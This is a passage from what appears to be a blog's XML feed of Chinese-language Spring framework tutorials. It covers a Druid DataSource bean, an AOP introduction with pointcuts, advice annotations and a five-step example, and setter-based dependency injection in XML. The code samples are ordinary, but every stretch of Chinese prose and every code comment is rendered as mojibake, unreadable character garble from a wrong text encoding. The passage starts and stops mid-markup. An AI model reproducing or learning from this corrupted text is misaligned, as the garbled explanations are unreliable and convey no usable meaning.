class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å¼•ç”¨ç±»å‹ä¾èµ–æ³¨å…¥</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Springä¼šè‡ªåŠ¨ä»IOCå®¹å™¨ä¸­æ‰¾åˆ°BookDaoå¯¹è±¡èµ‹å€¼ç»™å‚æ•°bookDaoå˜é‡ï¼Œå¦‚æœæ²¡æœ‰å°±ä¼šæŠ¥é”™ã€‚</span><span class="token annotation punctuation">@Bean</span> <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookDao<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ds<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><h4 id="AOPç®€ä»‹å’Œä½œç”¨"><a href="#AOPç®€ä»‹å’Œä½œç”¨" class="headerlink" title="AOPç®€ä»‹å’Œä½œç”¨"></a>AOPç®€ä»‹å’Œä½œç”¨</h4><ul><li>AOP(Aspect Oriented Programming)é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼ŒæŒ‡å¯¼å¼€å‘è€…å¦‚ä½•ç»„ç»‡ç¨‹åºç»“æ„<ul><li>OOP(Object Oriented Programming)é¢å‘å¯¹è±¡ç¼–ç¨‹</li></ul></li><li>ä½œç”¨ï¼šåœ¨ä¸æƒŠåŠ¨åŸå§‹è®¾è®¡çš„åŸºç¡€ä¸Šä¸ºå…¶è¿›è¡ŒåŠŸèƒ½å¢å¼ºã€‚ç®€å•çš„è¯´å°±æ˜¯åœ¨ä¸æ”¹å˜æ–¹æ³•æºä»£ç çš„åŸºç¡€ä¸Šå¯¹æ–¹æ³•è¿›è¡ŒåŠŸèƒ½å¢å¼ºã€‚</li><li>Springç†å¿µï¼šæ— å…¥ä¾µå¼/æ— ä¾µå…¥å¼</li></ul><p><strong>AOPä¸­çš„æ ¸å¿ƒæ¦‚å¿µï¼š</strong></p><blockquote><ul><li>è¿æ¥ç‚¹ï¼ˆJoinPointï¼‰ï¼šæ­£åœ¨æ‰§è¡Œçš„æ–¹æ³•ã€‚</li><li>åˆ‡å…¥ç‚¹ï¼ˆPointcutï¼‰ï¼šè¿›è¡ŒåŠŸèƒ½å¢å¼ºäº†çš„æ–¹æ³•ï¼Œè¿æ¥ç‚¹åŒ…å«åˆ‡å…¥ç‚¹ã€‚</li><li>åœ¨SpringAOPä¸­ï¼Œä¸€ä¸ªåˆ‡å…¥ç‚¹å¯ä»¥åªæè¿°ä¸€ä¸ªå…·ä½“æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åŒ¹é…å¤šä¸ªæ–¹æ³•<ul><li>ä¸€ä¸ªå…·ä½“æ–¹æ³•</li><li>åŒ¹é…å¤šä¸ªæ–¹æ³•ï¼š</li></ul></li><li>é€šçŸ¥ï¼ˆAdviceï¼‰ï¼šåœ¨åˆ‡å…¥ç‚¹å‰åæ‰§è¡Œçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¢å¼ºçš„å…±æ€§åŠŸèƒ½</li><li>åœ¨SpringAOPä¸­ï¼ŒåŠŸèƒ½æœ€ç»ˆä»¥æ–¹æ³•çš„å½¢å¼å‘ˆç°</li><li>é€šçŸ¥ç±»ï¼šé€šçŸ¥æ–¹æ³•æ‰€åœ¨çš„ç±»å«åšé€šçŸ¥ç±»</li><li>åˆ‡é¢ï¼ˆAspectï¼‰ï¼šæè¿°é€šçŸ¥ä¸åˆ‡å…¥ç‚¹çš„å¯¹åº”å…³ç³»ï¼Œä¹Ÿå°±æ˜¯å“ªäº›é€šçŸ¥æ–¹æ³•å¯¹åº”å“ªäº›åˆ‡å…¥ç‚¹æ–¹æ³•ã€‚</li></ul></blockquote><h4 id="AOPå…¥é—¨æ¡ˆä¾‹"><a href="#AOPå…¥é—¨æ¡ˆä¾‹" class="headerlink" title="AOPå…¥é—¨æ¡ˆä¾‹"></a>AOPå…¥é—¨æ¡ˆä¾‹</h4><p>è¿™é‡Œä½¿ç”¨çº¯æ³¨è§£å¼€å‘</p><ul><li>ã€ç¬¬ä¸€æ­¥ã€‘å¯¼å…¥aopç›¸å…³åæ ‡</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--springæ ¸å¿ƒä¾èµ–ï¼Œä¼šå°†spring-aopä¼ é€’è¿›æ¥--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--åˆ‡å…¥ç‚¹è¡¨è¾¾å¼ä¾èµ–ï¼Œç›®çš„æ˜¯æ‰¾åˆ°åˆ‡å…¥ç‚¹æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°è¦å¢å¼ºçš„æ–¹æ³•--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjweaver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬äºŒæ­¥ã€‘å®šä¹‰daoæ¥å£ä¸å®ç°ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao update ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬ä¸‰æ­¥ã€‘å®šä¹‰é€šçŸ¥ç±»ï¼Œåˆ¶ä½œé€šçŸ¥æ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é€šçŸ¥ç±»å¿…é¡»é…ç½®æˆSpringç®¡ç†çš„bean</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬å››æ­¥ã€‘å®šä¹‰åˆ‡å…¥ç‚¹è¡¨è¾¾å¼ã€é…ç½®åˆ‡é¢(ç»‘å®šåˆ‡å…¥ç‚¹ä¸é€šçŸ¥å…³ç³»)</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é€šçŸ¥ç±»å¿…é¡»é…ç½®æˆSpringç®¡ç†çš„bean</span><span class="token annotation punctuation">@Component</span><span class="token comment">//è®¾ç½®å½“å‰ç±»ä¸ºåˆ‡é¢ç±»ç±»</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">{</span>    <span class="token comment">//è®¾ç½®åˆ‡å…¥ç‚¹ï¼Œ@Pointcutæ³¨è§£è¦æ±‚é…ç½®åœ¨æ–¹æ³•ä¸Šæ–¹</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(void com.itheima.dao.BookDao.update())"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®åœ¨åˆ‡å…¥ç‚¹pt()çš„å‰é¢è¿è¡Œå½“å‰æ“ä½œ(å‰ç½®é€šçŸ¥)</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"pt()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬äº”æ­¥ã€‘åœ¨é…ç½®ç±»ä¸­è¿›è¡ŒSpringæ³¨è§£åŒ…æ‰«æå’Œå¼€å¯AOPåŠŸèƒ½</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token comment">//å¼€å¯æ³¨è§£å¼€å‘AOPåŠŸèƒ½</span><span class="token annotation punctuation">@EnableAspectJAutoProxy</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æµ‹è¯•ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç»“æœ</li></ul><p><img src="/2022/03/30/spring-kuang-jia-san/image-20210730151347354.png"></p><p>å¸¸è§çš„é€šçŸ¥</p><p>å‰ç½®é€šçŸ¥   æ–¹æ³•æ‰§è¡Œå‰è°ƒç”¨  å¯¹åº”æ³¨è§£ @Before</p><blockquote><p>è®¾ç½®å½“å‰é€šçŸ¥æ–¹æ³•ä¸åˆ‡å…¥ç‚¹ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œå½“å‰é€šçŸ¥æ–¹æ³•åœ¨åŸå§‹åˆ‡å…¥ç‚¹æ–¹æ³•å‰è¿è¡Œ</p></blockquote><p>åç½®é€šçŸ¥   æ–¹æ³•æ‰§è¡Œåè°ƒç”¨  å¯¹åº”æ³¨è§£ @After</p><blockquote><p>è®¾ç½®å½“å‰é€šçŸ¥æ–¹æ³•ä¸åˆ‡å…¥ç‚¹ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œå½“å‰é€šçŸ¥æ–¹æ³•åœ¨åŸå§‹åˆ‡å…¥ç‚¹æ–¹æ³•åè¿è¡Œ</p></blockquote><p>è¿”å›é€šçŸ¥   æ–¹æ³•è¿”å›åè°ƒç”¨  å¯¹åº”æ³¨è§£ @AfterReturning</p><blockquote><p>è®¾ç½®å½“å‰é€šçŸ¥æ–¹æ³•ä¸åˆ‡å…¥ç‚¹ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œå½“å‰é€šçŸ¥æ–¹æ³•åœ¨åŸå§‹åˆ‡å…¥ç‚¹æ–¹æ³•æ­£å¸¸æ‰§è¡Œå®Œæ¯•åè¿è¡Œ</p></blockquote><p>å¼‚å¸¸é€šçŸ¥   æ–¹æ³•å‡ºç°å¼‚å¸¸è°ƒç”¨ å¯¹åº”æ³¨è§£ @AfterThrowing</p><blockquote><p>è®¾ç½®å½“å‰é€šçŸ¥æ–¹æ³•ä¸åˆ‡å…¥ç‚¹ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œå½“å‰é€šçŸ¥æ–¹æ³•åœ¨åŸå§‹åˆ‡å…¥ç‚¹æ–¹æ³•è¿è¡ŒæŠ›å‡ºå¼‚å¸¸åæ‰§è¡Œ</p></blockquote><p>ç¯ç»•é€šçŸ¥   åŠ¨æ€ä»£ç†ã€æ‰‹åŠ¨æ¨èæ–¹æ³•è¿è¡Œ å¯¹åº”æ³¨è§£ @Around</p><blockquote><p>è®¾ç½®å½“å‰é€šçŸ¥æ–¹æ³•ä¸åˆ‡å…¥ç‚¹ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œå½“å‰é€šçŸ¥æ–¹æ³•åœ¨åŸå§‹åˆ‡å…¥ç‚¹æ–¹æ³•å‰åè¿è¡Œ</p></blockquote><h4 id="AOPå·¥ä½œæµç¨‹"><a href="#AOPå·¥ä½œæµç¨‹" class="headerlink" title="AOPå·¥ä½œæµç¨‹"></a>AOPå·¥ä½œæµç¨‹</h4><blockquote><ol><li>Springå®¹å™¨å¯åŠ¨</li><li>è¯»å–æ‰€æœ‰åˆ‡é¢é…ç½®ä¸­çš„åˆ‡å…¥ç‚¹</li><li>åˆå§‹åŒ–beanï¼Œåˆ¤å®šbeanå¯¹åº”çš„ç±»ä¸­çš„æ–¹æ³•æ˜¯å¦åŒ¹é…åˆ°ä»»æ„åˆ‡å…¥ç‚¹</li></ol><ul><li>åŒ¹é…å¤±è´¥ï¼Œåˆ›å»ºåŸå§‹å¯¹è±¡</li><li>åŒ¹é…æˆåŠŸï¼Œåˆ›å»ºåŸå§‹å¯¹è±¡ï¼ˆç›®æ ‡å¯¹è±¡ï¼‰çš„ä»£ç†å¯¹è±¡</li></ul><ol start="4"><li>è·å–beanæ‰§è¡Œæ–¹æ³•</li></ol><ul><li>è·å–çš„beanæ˜¯åŸå§‹å¯¹è±¡æ—¶ï¼Œè°ƒç”¨æ–¹æ³•å¹¶æ‰§è¡Œï¼Œå®Œæˆæ“ä½œ</li><li>è·å–çš„beanæ˜¯ä»£ç†å¯¹è±¡æ—¶ï¼Œæ ¹æ®ä»£ç†å¯¹è±¡çš„è¿è¡Œæ¨¡å¼è¿è¡ŒåŸå§‹æ–¹æ³•ä¸å¢å¼ºçš„å†…å®¹ï¼Œå®Œæˆæ“ä½œ</li></ul></blockquote><p><strong>åŸºç¡€æ¦‚å¿µï¼š</strong></p><blockquote><p>ç›®æ ‡å¯¹è±¡ï¼ˆTargetï¼‰ï¼šè¢«ä»£ç†çš„å¯¹è±¡ï¼Œä¹Ÿå«åŸå§‹å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­çš„æ–¹æ³•æ²¡æœ‰ä»»ä½•åŠŸèƒ½å¢å¼ºã€‚<br>ä»£ç†å¯¹è±¡ï¼ˆProxyï¼‰ï¼šä»£ç†åç”Ÿæˆçš„å¯¹è±¡ï¼Œç”±Springå¸®æˆ‘ä»¬åˆ›å»ºä»£ç†å¯¹è±¡ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaEE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶ï¼ˆäºŒï¼‰</title>
      <link href="/2022/03/30/spring-kuang-jia-er/"/>
      <url>/2022/03/30/spring-kuang-jia-er/</url>
      
        <content type="html"><![CDATA[<p>æ¥ä¸Šå›ã€‚ã€‚ã€‚</p><h2 id="ä¾èµ–æ³¨å…¥-DIé…ç½®"><a href="#ä¾èµ–æ³¨å…¥-DIé…ç½®" class="headerlink" title="ä¾èµ–æ³¨å…¥(DIé…ç½®)"></a>ä¾èµ–æ³¨å…¥(DIé…ç½®)</h2><h3 id="ä¾èµ–æ³¨å…¥çš„ä¸¤ç§æ–¹å¼"><a href="#ä¾èµ–æ³¨å…¥çš„ä¸¤ç§æ–¹å¼" class="headerlink" title="ä¾èµ–æ³¨å…¥çš„ä¸¤ç§æ–¹å¼"></a>ä¾èµ–æ³¨å…¥çš„ä¸¤ç§æ–¹å¼</h3><ul><li>setteræ³¨å…¥<br>ç®€å•ç±»å‹<br><strong>å¼•ç”¨ç±»å‹(å¾ˆå¸¸ç”¨)</strong></li><li>æ„é€ å™¨æ³¨å…¥<br>ç®€å•ç±»å‹<br>å¼•ç”¨ç±»å‹</li></ul><h4 id="setteræ–¹å¼æ³¨å…¥"><a href="#setteræ–¹å¼æ³¨å…¥" class="headerlink" title="setteræ–¹å¼æ³¨å…¥"></a>setteræ–¹å¼æ³¨å…¥</h4><p><strong>å¼•ç”¨ç±»å‹ï¼š</strong></p><ul><li>åœ¨beanä¸­å®šä¹‰å¼•ç”¨ç±»å‹å±æ€§å¹¶æä¾›å¯è®¿é—®çš„setæ–¹æ³•</li><li>åœ¨<code>Application.xml</code>ä¸­ä½¿ç”¨<code>property</code>æ ‡ç­¾<code>ref</code>å±æ€§æ³¨å…¥å¼•ç”¨ç±»å‹</li></ul><p>è¯¦æƒ…è§Springæ¡†æ¶ï¼ˆä¸€ï¼‰çš„DIå…¥é—¨æ¡ˆä¾‹</p><p><strong>ç®€å•ç±»å‹ï¼š</strong></p><ul><li>åœ¨beanä¸­å®šä¹‰å¼•ç”¨ç±»å‹å±æ€§å¹¶æä¾›å¯è®¿é—®çš„setæ–¹æ³•</li><li>åœ¨<code>Application.xml</code>ä¸­ä½¿ç”¨<code>property</code>æ ‡ç­¾<code>value</code>å±æ€§æ³¨å…¥ç®€å•æ•°æ®ç±»å‹</li></ul><p><strong>ä»£ç æ¼”ç¤ºï¼š</strong></p><ul><li>æ–°æ·»åŠ UserDaoæ¥å£å’ŒBookDaoä¸€æ ·</li><li>BookDaoImplæä¾›è¦æ³¨å…¥å¯¹è±¡çš„setæ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> databaseName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> connectionNum<span class="token punctuation">;</span>    <span class="token comment">//setteræ³¨å…¥éœ€è¦æä¾›è¦æ³¨å…¥å¯¹è±¡çš„setæ–¹æ³•</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setConnectionNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> connectionNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>connectionNum <span class="token operator">=</span> connectionNum<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDatabaseName</span><span class="token punctuation">(</span><span class="token class-name">String</span> databaseName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>databaseName <span class="token operator">=</span> databaseName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token operator">+</span>databaseName<span class="token operator">+</span><span class="token string">","</span><span class="token operator">+</span>connectionNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>é…ç½®æ–‡ä»¶æ³¨å…¥ç®€å•æ•°æ®ç±»å‹</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--æ³¨å…¥ç®€å•ç±»å‹--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--propertyæ ‡ç­¾ï¼šè®¾ç½®æ³¨å…¥å±æ€§--&gt;</span>        <span class="token comment">&lt;!--nameå±æ€§ï¼šè®¾ç½®æ³¨å…¥çš„å±æ€§åï¼Œå®é™…æ˜¯setæ–¹æ³•å¯¹åº”çš„åç§°--&gt;</span>        <span class="token comment">&lt;!--valueå±æ€§ï¼šè®¾ç½®æ³¨å…¥ç®€å•ç±»å‹æ•°æ®å€¼--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>connectionNum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mysql<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token 